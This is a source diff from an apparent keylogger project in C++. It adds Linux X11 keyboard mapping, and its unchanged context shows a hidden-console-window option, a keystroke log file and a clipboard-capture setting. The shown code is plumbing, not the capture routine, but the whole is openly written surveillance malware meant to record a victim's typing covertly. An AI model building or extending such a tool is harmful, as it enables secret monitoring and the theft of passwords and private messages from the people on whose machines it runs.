@@ -1,5 +1,6 @@
 #include "FileLogger.h"
 #include "KeycodeMapperEnUs.h"
+#include "KeycodeMapperEnUsX11.h"
 #include "SandboxListener.h"
 #include "StdoutLogger.h"
 
@@ -24,7 +25,11 @@
 
 Keylogger::IKeycodeMapper* getMapperByStr(std::string mapper) {
     if (mapper == "en-us") {
+    #ifdef __linux__
+        return new Keylogger::KeycodeMapperEnUsX11();
+    #else
         return new Keylogger::KeycodeMapperEnUs();
+    #endif
     }
     return nullptr;
 }
@@ -78,12 +83,12 @@ options:\n\
   -z, --hidden           hide the console window\n\
 \n\
 available keycode maps:\n\
-  us    US keyboard\n\
+  en-us    US keyboard\n\
 ";
 
     srand(time(0));
 
-    Keylogger::IKeycodeMapper* mapper = new Keylogger::KeycodeMapperEnUs();
+    Keylogger::IKeycodeMapper* mapper = getMapperByStr("en-us");
     std::string logName = "log";
 
     bool clipboardEnable = false;
